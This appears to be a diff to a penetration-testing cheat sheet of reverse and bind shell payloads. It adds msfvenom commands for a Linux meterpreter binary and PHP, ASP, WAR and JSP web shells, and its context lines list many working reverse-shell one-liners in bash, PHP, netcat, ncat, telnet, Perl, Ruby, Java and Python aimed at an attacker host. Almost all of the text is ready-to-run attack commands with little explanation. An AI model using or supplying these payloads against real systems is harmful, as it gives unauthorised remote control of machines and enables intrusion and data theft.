@@ -69,8 +69,15 @@ set payload windows/shell/reverse_tcp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
 ```
 
+## Linux
 
-## Bash
+### Binary
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
+```
+
+### Bash
 
 ```
 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
@@ -84,12 +91,13 @@ exec /bin/bash 0&0 2>&0
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-## Php
+### Php
+
 ```
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-## Netcat
+### Netcat
 If there is a firewall running on the target-machine you will not be able to bind a shell to it. But a reverse shell will work.
 
 Bind shell
@@ -103,6 +111,7 @@ nc.exe -nlvp 4444 -e cmd.exe
 ```
 
 Reverse shell
+
 ```
 nc 192.168.1.101 5555 -e /bin/bash
 nc -lvp 5555
@@ -122,7 +131,7 @@ nc -e /bin/sh ATTACKING-IP 80
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
-## Ncat
+### Ncat
 Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. 
 
 Bind
@@ -131,7 +140,7 @@ ncat --exec cmd.exe --allow 192.168.1.101 -vnl 555 --ssl
 ncat -v 192.168.1.103 5555 --ssl
 ```
 
-## Telnet
+### Telnet
 
 ```
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
@@ -142,28 +151,57 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```
 
 
-## Perl
+### Perl
 
 ```
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## Ruby
+### Ruby
 
 ```
 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-## Java
+### Java
+
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
-## Python
+### Python
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+
+## Web-shells - platform independent
+
+### PHP
+
+This php-shell is OS-independent. You can use it on both linux and windows.
+
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
+```
+
+### ASP
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
+```
+
+### WAR
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
+```
+
+### JSP
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
+```
